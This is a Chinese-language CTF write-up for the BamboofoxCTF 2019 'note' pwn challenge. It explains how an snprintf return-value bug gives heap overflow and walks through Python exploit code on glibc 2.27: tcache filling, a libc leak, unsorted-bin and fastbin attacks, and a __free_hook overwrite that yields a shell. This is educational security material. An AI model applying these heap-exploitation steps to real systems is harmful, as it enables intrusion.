BamboofoxCTF 2019 - [Pwn] note
===
- [Description](#Description)
    - [Reverse](#Reverse)
    - [Vulnerability](#Vulnerability)
    - [Exploit](#Exploit)
        - [leak libc](#Leak-libc)
        - [Rewrite hook](#Rewrite-hook)
- [Reference](#Reference)

# Description
題目出現 note 八九不離十跟 Heap 有關

![](https://i.imgur.com/p9sQZUY.png)

![](https://i.imgur.com/3Ugzibk.png)

另外附上了 libc-2.27，是有用 Tcache 的 libc 版本

## Reverse
note 共有五種操作
1. Create
    - 最大只能申請 0x400 size 的 chunk，意即只能拿 fast/small chunk
    - 有一 global 變數 notes 紀錄每個 note，最高紀錄 8 個 note，記著每個 note 的：
        1. 是否存在此 note
        2. note 的記憶體位址
        3. note 的長度
    - **特別注意，是用 calloc 申請 memory，導致了申請時不會從 Tcache 拿**

2. Edit
    - 輸入 index
    - 若 global variable notes 中紀錄是有存在第 index 個 note 才會繼續
    - 用 read 讀取輸入存放到 note，根據 global 所記載此 note 多長來決定讀幾個字
3. Show
    - 輸入 index
    - 跟 edit 行為差不多，根據 global 所記載此 note 多長來決定寫幾個字到 stdout 
4. Copy
    - 輸入 srcIdx 和 dstIdx
    - 兩個 note 都存在的話，執行以下
        ```c
        v1 = (unsigned int)snprintf(
                             (char *)notePtr[desIdx].noteptr,
                             noteSize_202068[3 * desIdx],
                             "%s",
                             notePtr[srcIdx].noteptr);
        v0 = noteSize_202068;
        noteSize_202068[3 * desIdx] = v1;           // snprintf 不是 return 寫了多少字, 而是來源目標多長 ?!
        ```
    - 從 srcIdx note 寫到 dstIdx note，寫多少字是由 dstIdx note 多長決定
5. Delete
    - 清除指定 idx note，這邊看起來沒什麼問題

## Vulnerability
問題就出現在 Copy 中 snprintf 的回傳值
- 預想是會回傳 **寫幾個字** 才對
- 但回傳的卻是 **來源的字串長度**

所以若我有兩個筆記 A B
- A note 長度原本只有 0x20
- B note 長度有 0x400，且先用 edit 將此 note 寫好寫滿 0x3ff 個字
- 此時再用 copy 把 B 複製到 A 
- **雖然只會寫 0x1f 個字到 A，但 snprintf 回傳 0x3ff**
- **導致後面設定 A note 長度時設定為 0x3ff**
- **下次 edit A 就能寫 0x3ff 個字**
- **導致Heap Overflow**

阿至於你問我怎麼知道 snprintf 這 ~~bug~~feature?

其實我是亂賽賽出來的，給你參考。

## Exploit
攻擊方式概念簡述一下

因為防護幾乎全開的情況下，只能朝以下去想
1. Rewrite `__malloc_hook` `__free_hook`
2. ROP
3. Others

走第一條的話則要有 libc 的 base address

所以 leak libc 是首要任務

接著就是想辦法搞出一塊 chunk 在 hook 的前方
再透過寫入此 chunk 來 rewrite hook

### Leak libc
想辦法弄出 unsortbin，他的 fd bk 就會是 libc 中 main_arena 的相關位址

在沒有 Tcache 前，Free 掉 small chunk，此 chunk 就會先變成 unsortbin

但有 Tcache 後則是要等 Tcache 先填滿後才會放到 unsortbin

```c
_int_free (mstate av, mchunkptr p, int have_lock)
{
  ...
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size); // (size - 0x10 - 1) / 0x10

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
  ...
}
```

那就把 Tcache 填好填滿吧 ;)

exploit 中把 Tcache 填滿的部分:
```python
# Fill Tcache
for _ in range(7):
    create(0xa0)
    create(0x60)
    create(0x10)
    create(0x30)
    delete(0)
    delete(1)
    delete(2)
    delete(3)
```
- create 後再 delete 掉就會填一個 bin 到對應 size 的 Tcache
- 第二次 create 照理說會把 Tcache 中的 bin 拿掉
    - 但由於 create 是用 calloc，並不會從 Tcache 拿，所以才能這樣填滿 Tcache

繼續看 exploit
```python
create(0x10) # 0
create(0xa0) # 1
create(0x10) # 2, prevent 0xa0 to be merged by top chunk
create(0x400) # 3
edit(1, b'a'*(0xa0-1), sendline=False)
edit(3, b'b'*(0x400-1), sendline=False)

# Write length 0x400-1 to idx 0 & 2
# It actually only holds 0x10 bytes, leading to memory leak
copy(3, 0)
copy(3, 2)

# Make unsortbin
delete(1)
```
- notes[3] 寫了 0x3ff 個 'b'
- copy(3,0) 會將 0xf 個 'b' 寫到 notes[0].notePtr 中
    - **並設定 notes[0].size 為 0x3ff**
- copy(3,2) 是一樣的效果
- delete(1) 由於前面已經把對應 0xb0 的 Tcache 填滿，這一塊 chunk 就會變成 unsortbin
- notes[1] 對應的 chunk 之 fd 和 bk 現在會存放 libc address

繼續囉
```python
# Leak libc
show(0)
r.recv(0x10) # 'a' from copy(1, 0)
r.recv(0x10) # next chunk's head
libc.address = u64(r.recv(0x8)) - 0x3ebca0 # fd
print('libc: {:#x}'.format(libc.address))
```
- notes[0] 在 notes[1] 前面，且現在 notes[0].size 是 0x3ff
- show(0) 會寫出 0x3ff 個字, leak libc!

### Rewrite hook
這邊我有嘗試過 rewrite \_\_malloc_hook 成 one gadget

但 one gadget 條件不符合

又由於我們呼叫 create 只能輸入低於 0x400 傳進 calloc
所以改寫 \_\_malloc_hook 為 system，並輸入 `/bin/sh` 字串在 libc 中的位址給 calloc，來達到 `system("/bin/sh")` 也不可行

思維就跑到了改寫 \_\_free_hook 為 system，並將其中一個 note 內容寫為 `/bin/sh`，再 free 這個 note，就能達到`system("/bin/sh")`

這邊的招跟打 [CS_2019_Fall note++](https://hackmd.io/_Pu0GT_vRaywozC9KPgHzg#Note1) 這題的方式很像，差別是那題是 libc-2.23，沒有 Tcache。強烈建議看這一篇再回來繼續看。

繼續看 exploit
```python
create(0x60) # 1
delete(1)
```
`create(0x60)` 再 free 他
- 因為有 unsortbin(size 0xb0)，申請這塊從 unsortbin拿
    - unsortbin size 剩下 0xb0-0x70 = 0x40
- free 他時，因為 0x70 Tcache 是滿的，且屬於 fastbin，會存到 0x70 fastbin

這邊就是造一個 fastbin，等等打 fastbin attack，回顧一下目前記憶體配置:

| note id  | size(含 chunk header) | 註解
| -------- | -------------------- | ---- 
| 0        | 0x20 | notes[0].size = 0x3ff
| | 0x70 | fastbin
| | 0x40 | unsortbin
| 2 | 0x20 | notes[2].size = 0x3ff
| 3 | 0x410 |

可以看到改 note[0] 可以同時爆改 fastbin 和 unsortbin

繼續
```python
fd = libc.symbols['__free_hook'] - 0x63
bk = libc.symbols['__free_hook'] - 0x70
payload = b'c'*0x10 + \
        p64(0) + p64(0x71) + \
        p64(fd) + p64(0) + \
        b'd'*0x50 + \
        p64(0x0) + p64(0x41) + \
        p64(0x0) + p64(bk)

edit(0, payload)
```
如此一來，就改爆了:
- fastbin 的 fd 變成 `libc.symbols['__free_hook'] - 0x63`
- unsortbin 的 bk 變成 `libc.symbols['__free_hook'] - 0x70`

exploit 快結束了:
```python
create(0x30) # 1, Attack unsortbin

create(0x60) # 4, Attack fastbin
create(0x60) # 5
```
- `create(0x30) # 1, Attack unsortbin`
    - 拿 unsortbin
    - 因為要求的 size 剛好跟 unsortbin 的 size 一樣，所以會做
        ```c
        unsorted_chunks(av)->bk = bck;
        bck->fd = unsorted_chunks(av);
        ```
        - 將 main_arena unsortbin 的 bk 設為 `libc.symbols['__free_hook'] - 0x70`
            - **這樣會使 unsortbin 爛掉，接下來的 exploit 若申請 memory 時動到 unsortbin，就會GG**
        - 將 `libc.symbols['__free_hook'] - 0x70 + 0x10` (因為 fd 的 offset 是 0x10) 設為 main_arena unsortbin 位址
    - 如此一來就寫了 0x7fxxxxxxxxxx 到 `libc.symbols['__free_hook'] - 0x60`
- `create(0x60) # 4, Attack fastbin` 
    - 因為 0x70 fastbin 有東東，就直接從 fastbin 拿
    - 巧妙避免因為動到 unsortbin 而 GG
    - 拿走第一個在 fastbin 的 bin 後，下一塊會拿
        `libc.symbols['__free_hook'] - 0x63`
- `create(0x60) # 5`
    - 因為前面 unsortbin attack 把 0x7fxxxxxxxx 寫到
      `libc.symbols['__free_hook'] - 0x60`
    - 所以 `libc.symbols['__free_hook'] - 0x63` 為合法的 0x70 chunk 位址
    - 我們就申請到一塊會從 `libc.symbols['__free_hook'] - 0x53` 開始寫入的 note 囉

申請到了就可以開心寫嚕
```python
# write system to __free_hook
payload = b'\0' * 0x53 + p64(libc.symbols['system'])
edit(5, payload)

edit(3, b'/bin/sh\x00')

delete(3)
```

pwned.

剩下加的 sleep 延遲是打遠端讓遠端 buffer 讀寫一下再繼續輸入

# Reference
- [CS_2019_Fall note++](https://hackmd.io/_Pu0GT_vRaywozC9KPgHzg#Note1)

###### tags: `CTF`